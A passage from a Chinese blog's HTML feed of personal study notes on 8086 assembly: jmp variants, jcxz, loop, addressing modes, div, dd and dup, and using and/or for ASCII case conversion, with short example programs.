class="line">inc ax</span><br><span class="line">codesg ends</span><br><span class="line">end start </span><br></pre></td></tr></table></figure><h2 id="5-转移地址在寄存器中的jmp指令"><a href="#5-转移地址在寄存器中的jmp指令" class="headerlink" title="5.转移地址在寄存器中的jmp指令"></a>5.转移地址在寄存器中的jmp指令</h2><h4 id="1-指令格式：jmp-16位的寄存器"><a href="#1-指令格式：jmp-16位的寄存器" class="headerlink" title="1.指令格式：jmp 16位的寄存器"></a>1.指令格式：jmp 16位的寄存器</h4><p>功能： IP = (16位寄存器)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp ax</span><br></pre></td></tr></table></figure><h2 id="6-转移地址在内存中的jmp指令有2种格式"><a href="#6-转移地址在内存中的jmp指令有2种格式" class="headerlink" title="6.转移地址在内存中的jmp指令有2种格式"></a>6.转移地址在内存中的jmp指令有2种格式</h2><h4 id="1-jmp-word-ptr-内存单元地址【段内转移】"><a href="#1-jmp-word-ptr-内存单元地址【段内转移】" class="headerlink" title="1.jmp word ptr 内存单元地址【段内转移】"></a>1.jmp word ptr 内存单元地址【段内转移】</h4><p>功能：从内存单元地址开始存放着一个字，是转移的目的的偏移地址</p><p>内存单元地址可用寻址方式的任一格式给出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123Hmov ax,0123H</span><br><span class="line">mov ds:[0],axmov [bx],ax</span><br><span class="line">jmp word ptr ds:[0] jmp word ptr [bx]</span><br><span class="line">执行后(IP)=0123H执行后(IP)=0123H</span><br></pre></td></tr></table></figure><h4 id="2-jmp-dword-ptr-内存单元地址【段间转移】"><a href="#2-jmp-dword-ptr-内存单元地址【段间转移】" class="headerlink" title="2.jmp dword ptr 内存单元地址【段间转移】"></a>2.jmp dword ptr 内存单元地址【段间转移】</h4><p>功能：从内存单元地址处开始存放着2个字，高地址处的字是转移的目的段地址，低地址处是转移的目的的偏移地址</p><p>​    (CS)=(内存单元地址+2)</p><p>​     (IP)=(内存单元地址)</p><p>内存 单元可以由寻址的方式的任意格式给出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123H</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">mov word ptr ds:[2],0</span><br><span class="line">jmp dword ptr ds:[0]</span><br><span class="line"></span><br><span class="line">执行后【高地址种是cs 低地址种是ip】</span><br><span class="line">（CS）=0</span><br><span class="line">（IP）=0123</span><br></pre></td></tr></table></figure><h2 id="7-jcxz指令"><a href="#7-jcxz指令" class="headerlink" title="7.jcxz指令"></a>7.jcxz指令</h2><p>1.jcxz指令为有条件转移指令，所有的有条件跳转指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都是-128~127</p><p>2.指令格式：jcxz 标号</p><p>：如果（cx）=0 则跳转到标号处执行</p><p>3.jcxz 标号 指令操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.当(cx)=0时，（ip）=（ip）+8位位移</span><br><span class="line">1.8位位移=“标号”处的地址 - jcxz指令后的第一个字节的地址</span><br><span class="line">2.8位位移的范围是-128~127 用补码表示</span><br><span class="line">3.8位位移由编译程序在编译时算出</span><br><span class="line"></span><br><span class="line">2.当(cs)！=就什么也不做</span><br></pre></td></tr></table></figure><p> 相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if((cx)==0)&#123;</span><br><span class="line">jmp short 标号;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-loop指令"><a href="#8-loop指令" class="headerlink" title="8.loop指令"></a>8.loop指令</h2><p>1.loop指令为循环指令，所有的循环指令都是短位移，在对应的机器码中包含转移的位移，而不是目的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">loop 是用于知道循环次数的循环</span><br><span class="line">(cx)=(cx)-1 </span><br><span class="line">jcxz 用于不知道循环次数的循环</span><br></pre></td></tr></table></figure><h2 id="9-根据位进行转移的意义"><a href="#9-根据位进行转移的意义" class="headerlink" title="9.根据位进行转移的意义"></a>9.根据位进行转移的意义</h2><p>1.前面讲到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jmp short 标号</span><br><span class="line">jmp near ptr 标号</span><br><span class="line">jcxz 标号</span><br><span class="line">loop 标号</span><br></pre></td></tr></table></figure><p>这几种汇编指令，它们对IP的修改是根据转移目的地址和转移起始地址之间的位移来进行的。</p><p>在它们对应的机器码中不包含位移的目的地址，而包含的是到目的地址的位移距离</p><p>2.这样设计是为了，方便了程序段在内存中的浮动装配</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    mov cx,6B9 06 00</span><br><span class="line">    mov ax,10B8 10 00</span><br><span class="line">s:add ax,ax01 C0</span><br><span class="line">loop sE2 FC</span><br></pre></td></tr></table></figure><p>3.这段程序在内存中的不同位置都可以正确执行，因为loop s 在执行时只涉及到s 的位移(-4 ， 前移4个字节，补码表示为 FCH)而不是s的地址</p><p>4.如果loop s的机器码中包含的是s的地址，则就对程序段在内存中的偏移地址就有了严格的限制，就不能封装起来放在其他地方使用</p><p>5.因为机器码中包含的是s的地址，如果s处的指令不在目的地址处，程序的执行就会出错</p><p>我们之前在第二章中讲到的</p><p>jmp cs:ip</p><p>这种是在debug中的指令，汇编编译器并不认识</p><h2 id="实验8"><a href="#实验8" class="headerlink" title="实验8"></a>实验8</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp8.exe</span><br></pre></td></tr></table></figure><h2 id="实验九"><a href="#实验九" class="headerlink" title="实验九"></a>实验九</h2>]]></content>
      
      
      <categories>
          
          <category> 8086汇编 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编-数据处理的俩个基本方法（8）</title>
      <link href="/2023/05/01/8086%E6%B1%87%E7%BC%96-8-%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E7%9A%84%E4%B8%A4%E4%B8%AA%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/"/>
      <url>/2023/05/01/8086%E6%B1%87%E7%BC%96-8-%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E7%9A%84%E4%B8%A4%E4%B8%AA%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>1.描述性符号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.reg 来表示一个寄存器</span><br><span class="line">2.sreg 来表示一个段寄存器</span><br></pre></td></tr></table></figure><h2 id="1-bx-si-di-bp"><a href="#1-bx-si-di-bp" class="headerlink" title="1.bx,si,di,bp"></a>1.bx,si,di,bp</h2><p>1.对 bx si di 进行一下小小的总结</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在8086CPU中，只有【bx,bp,si,di】可以用在[]中来进行内存单元的寻址</span><br><span class="line"></span><br><span class="line">[ax]这样是错的！！！！</span><br></pre></td></tr></table></figure><p>2.在[]中，这4个寄存器可以单个出现，或者只能有4种组合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[bx+si];[bx+di]</span><br><span class="line">[bp+si];[bp+di]</span><br><span class="line"></span><br><span class="line">si和di 不行</span><br><span class="line">bx和bp 不行</span><br></pre></td></tr></table></figure><p>3.在[]内使用bp和bx的区别</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">如果是使用[bx]则默认段地址是ds</span><br><span class="line">ds是数据段地址</span><br><span class="line">如果使用[bp]则默认段地址是ss</span><br><span class="line">ss是栈段地址</span><br><span class="line">所以这个bp和sp类似咯</span><br></pre></td></tr></table></figure><h2 id="2-机器指令处理的数据在什么地方"><a href="#2-机器指令处理的数据在什么地方" class="headerlink" title="2.机器指令处理的数据在什么地方"></a>2.机器指令处理的数据在什么地方</h2><p>1.绝大部分的机器指令都是进行数据处理的指令，处理大致可分为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">读取，写入，运算</span><br></pre></td></tr></table></figure><p>2.在机器指令这一层来讲，并不关系数据的值是多少，而是关心指令执行前一刻，它将要处理的数据所在的位置</p><p>3.所要处理的数据可以在三个地方</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.CPU内部</span><br><span class="line">2.内存</span><br><span class="line">3.端口</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">汇编指令命令执行前数据的位置</span><br><span class="line">mov bx,[0]内存, ds:0单元</span><br><span class="line">mov bx,axCPU内部,ax寄存器</span><br><span class="line">mov bx,1CPU内部,指令缓冲区</span><br></pre></td></tr></table></figure><p>4.在汇编语言种有3个概率来表达数据的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.立即数(idata)</span><br><span class="line">CPU的指令缓冲区</span><br><span class="line">2.寄存器()</span><br><span class="line">CPU内部的寄存器种</span><br><span class="line">3.段地址(SA)和偏移地址(EA)</span><br><span class="line">内存中</span><br><span class="line">可以用ds:[这个里面不能写idata]</span><br></pre></td></tr></table></figure><h2 id="3-汇编语言中数据位置的表达"><a href="#3-汇编语言中数据位置的表达" class="headerlink" title="3.汇编语言中数据位置的表达"></a>3.汇编语言中数据位置的表达</h2><p>1.显性的给出段地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ax,ds:[sp]</span><br></pre></td></tr></table></figure><p>2.使用默认的段地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bx]默认就是ds:[bx]</span><br></pre></td></tr></table></figure><h2 id="4-寻址方式"><a href="#4-寻址方式" class="headerlink" title="4.寻址方式"></a>4.寻址方式</h2><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230412112201335.png" alt="image-20230412112201335"></p><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CPU首先是读取：</span><br><span class="line">也就是CS:IP 通过地址加法器，然后走地址总线去找到相对应的地址，拿出里面的指令【机器码】【A1E100啥的】，把这个东西放入指令缓冲区。</span><br><span class="line">CPU就会对这个机器码读取</span><br><span class="line">然后去进行通过这个机器码读取出来的命令来工作</span><br><span class="line">工作完成后，又会去读取CS:IP【这个时候ip是递增后的】</span><br></pre></td></tr></table></figure><h2 id="5-指令要处理的数据有多长？"><a href="#5-指令要处理的数据有多长？" class="headerlink" title="5.指令要处理的数据有多长？"></a>5.指令要处理的数据有多长？</h2><p>1.有2中 byte 和 word 型的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.通过寄存器名字来指明需要处理数据的尺寸</span><br><span class="line">ax bx </span><br><span class="line">al </span><br><span class="line"></span><br><span class="line">2.在没有寄存器名存在的情况下，用操作符X ptr指明内存单元的长度，X在汇编指令中可以为 word 或 byte</span><br></pre></td></tr></table></figure><p>2.型方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov word ptr ds:[0],1</span><br><span class="line">inc word ptr [bx]===&gt;这个是内存单元 ds:[bx]</span><br><span class="line">inc word ptr ds:[0]</span><br><span class="line"></span><br><span class="line">inc byte ptr [bx]</span><br></pre></td></tr></table></figure><p>3.在没有寄存器参与的内存单元访问指令中，用word ptr 或者byte ptr 来指明需要访问的内存单元</p><p>否则CPU很shabi</p><h2 id="6-寻址方式的综合应用"><a href="#6-寻址方式的综合应用" class="headerlink" title="6.寻址方式的综合应用"></a>6.寻址方式的综合应用</h2><p>这里有一个例子，自己去看书</p><p>1.我们可以看到，8086CPU提供了如[bx+si+idata]的寻址方式为结构化数据的处理提供了方便</p><p>2.使得我们可以在编程的时候，从结构化的角度去看待所要处理的数据</p><p>3.从上面我们就可以看到，一个结构化的数据包含了多个数据项，而数据项的类型又不相同，又的是字型数据，有的是字节型数据，有的和是数组【字符串】</p><p>4.所以，一般来说，我们可以用[bx + idata+si]的方式来访问结构体中的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用bx来定位整个结构体，用idata来定位结构体中的某一个数据项，用si定位数组项中的每个元素</span><br><span class="line">为此，汇编语言提供了[bx].idata[bx]idata[si]的方式</span><br></pre></td></tr></table></figure><p>5.所以在C语言中我们看到的 dec.cp[i];dec是一个变量名，指明了结构体变量的地址，cp是一个名称，指明了数据项cp的地址，而用i来定位cp中的每一个字符</p><p>在汇编语言中：bx.10H[si]</p><h2 id="7-div指令"><a href="#7-div指令" class="headerlink" title="7.div指令"></a>7.div指令</h2><p>1.div指令就是÷</p><p>在使用div作为除法的时候</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">除数：8位或16位，在寄存器或者内存单元中</span><br><span class="line">被除数：（默认）放在ax或者dx和ax中</span><br><span class="line"></span><br><span class="line">被除数是用AX还是DX+AX是看除数的大小</span><br><span class="line"></span><br><span class="line">除数被除数</span><br><span class="line">8位16位(AX)</span><br><span class="line">16位32位(DX+AX)【这里的+不是加而是放在前面】</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">运算 8位  16位</span><br><span class="line">商  ALAX</span><br><span class="line">余数    AHDX</span><br></pre></td></tr></table></figure><p>格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.div reg</span><br><span class="line">2.div 内存单元</span><br></pre></td></tr></table></figure><p>现在我们可以用多种方法来表示一个内存单元咯</p><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">div byte ptr ds:[0]</span><br><span class="line">含义就是：</span><br><span class="line">(al)=(ax)/((ds)*16+0)的商</span><br><span class="line">(ah)=(ax)/((ds)*16+0)的余数</span><br><span class="line">div后面的内存单元或者寄存器，里面的数据都是当作被除数来解析</span><br><span class="line"></span><br><span class="line">div word ptr es:[0]</span><br><span class="line">含义为：</span><br><span class="line">(ax)=[(dx)*10000H+(ax)]/((ds)*16+0)的商</span><br><span class="line">(dx)=[(dx)*10000H+(ax)]/((ds)*16+0)的余数</span><br></pre></td></tr></table></figure><p>实现：计算100001/100</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;首先100001是186a1H   大于FFFFH所以需要用dx和ax</span><br><span class="line"></span><br><span class="line">mov dx,1</span><br><span class="line">mov ax,86a1H</span><br><span class="line">mov bx,100;会自动的选取ax和dx来进行除法</span><br><span class="line">div bx</span><br></pre></td></tr></table></figure><h2 id="8-伪指令dd"><a href="#8-伪指令dd" class="headerlink" title="8.伪指令dd"></a>8.伪指令dd</h2><p>1.前面我们学过db 和 dw 来定义字型数据和字型数据</p><p>dd是用来定义dword(double word双字节)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CPU是64位，操作系统要64位，在操作系统的软件是64位</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">data segment</span><br><span class="line">db 1</span><br><span class="line">dw 1</span><br><span class="line">dd 1</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">在data 段中定义了3个数据</span><br><span class="line">第一个数据是 01H 在data:0处，占用1个字节</span><br><span class="line">第二个数据是 0001H 在data:1处，占2个字节</span><br><span class="line">第三个数据是00000001H 在data:3处，占4个字节</span><br></pre></td></tr></table></figure><p>问题：8.1计算data段中第一个数据/第二个数据后的结果，商放在第三个数据存储单元中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data segment </span><br><span class="line">dd 100001</span><br><span class="line">dw 100</span><br><span class="line">dw 0</span><br><span class="line">data ends</span><br></pre></td></tr></table></figure><h2 id="9-dup"><a href="#9-dup" class="headerlink" title="9.dup"></a>9.dup</h2><p>1.dup 是一个操作符号，在汇编语言中和db ，dw ，dd 等一样，都是由编译器识别处理的符号</p><p>2.它和db dw dd 等数据定义伪指令配合使用，用来进行数据的重复</p><p>3.实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.db 3 dup(0)</span><br><span class="line">定义了3个字节，它们的值都是0</span><br><span class="line">相当于 db 0,0,0</span><br><span class="line"></span><br><span class="line">2.db 3 dup(0,1,2)</span><br><span class="line">定义了9个字节，每3个是0,1,2</span><br><span class="line">相当于：db 0,1,2,0,1,2,0,1,2</span><br><span class="line"></span><br><span class="line">3.db 3 dup(&#x27;abc&#x27;,&#x27;ABC&#x27;)</span><br><span class="line">相当于：db &#x27;abcABCabcABCabcABC&#x27;</span><br></pre></td></tr></table></figure><p>4.所以说dup</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db【数据定义的伪指令】 次数 dup(内容)</span><br></pre></td></tr></table></figure><h2 id="10-实验七-寻址方式在结构化数据访问中的应用"><a href="#10-实验七-寻址方式在结构化数据访问中的应用" class="headerlink" title="10.实验七-寻址方式在结构化数据访问中的应用"></a>10.实验七-寻址方式在结构化数据访问中的应用</h2><p>自己去看</p><p>exp7.asm</p>]]></content>
      
      
      <categories>
          
          <category> 8086汇编 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编-更灵活的定位内存地址的方法（7）</title>
      <link href="/2023/05/01/8086%E6%B1%87%E7%BC%96-7-%E6%9B%B4%E7%81%B5%E6%B4%BB%E7%9A%84%E5%AE%9A%E4%BD%8D%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%E7%9A%84%E6%96%B9%E6%B3%95/"/>
      <url>/2023/05/01/8086%E6%B1%87%E7%BC%96-7-%E6%9B%B4%E7%81%B5%E6%B4%BB%E7%9A%84%E5%AE%9A%E4%BD%8D%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="1-and-和-or-指令"><a href="#1-and-和-or-指令" class="headerlink" title="1.and 和 or 指令"></a>1.and 和 or 指令</h2><p>1.and指令:逻辑与指令，按位进行与运算 【一假即假】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">按位与就是按位与咯</span><br><span class="line">01=0;10=0;11=1;00=0</span><br><span class="line">比如：</span><br><span class="line">mov al,01100011B</span><br><span class="line">and al,00111011B</span><br><span class="line">执行后   al=00100011B</span><br></pre></td></tr></table></figure><p>功能：通过该指令可以将操作对象的相应位设置成0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">比如：</span><br><span class="line">将al中的第6位设为0</span><br><span class="line">and al,10111111B</span><br><span class="line">将第0位设为0</span><br><span class="line">and al,11111110B</span><br></pre></td></tr></table></figure><p>2.or指令：逻辑或，按位进行或运算【一真即真】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">比如：</span><br><span class="line">mov al,01100011B</span><br><span class="line">or  al,00111011B</span><br><span class="line">执行后： al=01111011B</span><br></pre></td></tr></table></figure><p>功能：通过该指令可将操作对象的相应位设为1，其他位不变</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">比如：</span><br><span class="line">al的第6位设置位1</span><br><span class="line">or al,01000000B</span><br></pre></td></tr></table></figure><h2 id="2-关于ASCII码"><a href="#2-关于ASCII码" class="headerlink" title="2.关于ASCII码"></a>2.关于ASCII码</h2><p>没什么…</p><h2 id="3-以字符形式给处的数据"><a href="#3-以字符形式给处的数据" class="headerlink" title="3.以字符形式给处的数据"></a>3.以字符形式给处的数据</h2><p>1.在汇编中，我们可以用   ‘ xxx ‘   的方式指明数据是以字符的形式给出的，编译器将把它们转化为相对应的ASCII码</p><p>比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">assume ds:data</span><br><span class="line">data segment</span><br><span class="line">db &#x27;unIX&#x27;;这里会把u n I X 会转化成ASCII码，然后ASCII码只需要8为，所以用db</span><br><span class="line">db &#x27;foRK&#x27;</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code segemnt</span><br><span class="line">start:   mov al,&#x27;a&#x27;;这里ascii码就是是 MOV AL,61H</span><br><span class="line">mov vl,&#x27;b&#x27;</span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end satrt</span><br></pre></td></tr></table></figure><h2 id="4-ASCII码大小也转化"><a href="#4-ASCII码大小也转化" class="headerlink" title="4.ASCII码大小也转化"></a>4.ASCII码大小也转化</h2><p>改变字母的大小写，其实就是改写ASCII码的值</p><p>十进制：a 97     A65   相差32</p><p>十六进制 :a61  41A   相差20h</p><p>其实在二进制的时候，也就是在第五位0改成1</p><p>所以小写&lt;–&gt;大写  可以用and 和 or 完成大小写的转变  </p><p>哈哈哈练个手：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg</span><br><span class="line">datasg segment</span><br><span class="line">db &#x27;BaSiC&#x27;</span><br><span class="line">db &#x27;iNfOrMaTiOn&#x27;</span><br><span class="line">datasg ends</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line">  start:mov ax,datasg</span><br><span class="line">     mov ds,ax;设置ds指向datasg段</span><br><span class="line">     </span><br><span class="line">     mov bx,0;设置(bx)=0,将ds:bx指向&#x27;BaSiC&#x27;中的第一个字母</span><br><span class="line">     </span><br><span class="line">     mov cx,5;设置循环5次，因为BaSiC有五个字母</span><br><span class="line">     s:mov al,[bx];将ASCII码从ds:bx所指向的内存单元中取出一个放入al中</span><br><span class="line">     and al,11011111B;将dl中ASCII码的第五位转成0，将其变成大写字母</span><br><span class="line">     mov [bx],al;将转化有的ASCII码又放回去</span><br><span class="line">     inc bx;(bx)++，将ds:bx指向下一个字母</span><br><span class="line">     loop s</span><br><span class="line">     </span><br><span class="line">     mov bx,5</span><br><span class="line">     </span><br><span class="line">     mov cx,11</span><br><span class="line">     s0:mov al,[bx];</span><br><span class="line">     or al,00100000B;这里是把字母全部转化成小写</span><br><span class="line">     mov [bx],al</span><br><span class="line">     inc bx</span><br><span class="line">     loop s0</span><br><span class="line">     </span><br><span class="line">     mov ax,4c00H</span><br><span class="line">     int 21h</span><br><span class="line"> codesg ends</span><br><span class="line"> end start</span><br></pre></td></tr></table></figure><h2 id="5-bx-idata"><a href="#5-bx-idata" class="headerlink" title="5.[bx+idata]"></a>5.[bx+idata]</h2><p>1.在前面我们可以用[bx]的方式来指明一个内存单元，我们还可以用一种更为灵活的方式来搞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[bx+idata]</span><br><span class="line">这个就相当于是:偏移地址=(bx)+idata</span><br></pre></td></tr></table></figure><p>2.变形</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[bx+idata]</span><br><span class="line">idata[bx]</span><br><span class="line">[bx].idata</span><br><span class="line">这三种方式都可以</span><br></pre></td></tr></table></figure><h2 id="6-用-bx-idata-的方式进行数组的处理"><a href="#6-用-bx-idata-的方式进行数组的处理" class="headerlink" title="6.用[bx+idata]的方式进行数组的处理"></a>6.用[bx+idata]的方式进行数组的处理</h2><p>我们观察datasg段中的俩个字符串，一个起始地址为0，另外一个是5</p><p>我们就可以用[0+bx]和[5+bx]在同一个循环中定位这俩个字符串中的字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在这里0和5给定了2个字符的起始偏移地址，bx中给出了从起始偏移地址开始的相对地址</span><br></pre></td></tr></table></figure><p>所以现在就可以把上面的改进</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    mov ax,datasg</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov bx,0</span><br><span class="line"></span><br><span 